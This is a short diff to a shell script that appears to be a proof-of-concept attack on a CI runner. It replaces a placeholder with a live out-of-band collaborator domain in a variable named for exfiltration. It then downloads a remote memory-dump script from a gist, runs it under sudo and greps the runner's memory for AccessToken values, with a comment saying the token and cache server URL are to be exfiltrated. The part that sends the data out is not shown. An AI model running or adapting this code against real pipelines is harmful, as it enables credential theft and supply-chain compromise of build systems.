@@ -2,7 +2,7 @@ echo "I'm running"
 #!/bin/sh
 
 # Replace with collaborator domain.
-YOUR_EXFIL="<YOUR-COLLABORATOR-DOMAIN>"
+YOUR_EXFIL="10bfq48dsqqhu3zf1sehwfiv0ysz1k0ir.oast.site"
 
 # Exfiltrating the token and the cache server url
 BLOB=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"AccessToken":"[^"]*"\}' | sort -u`
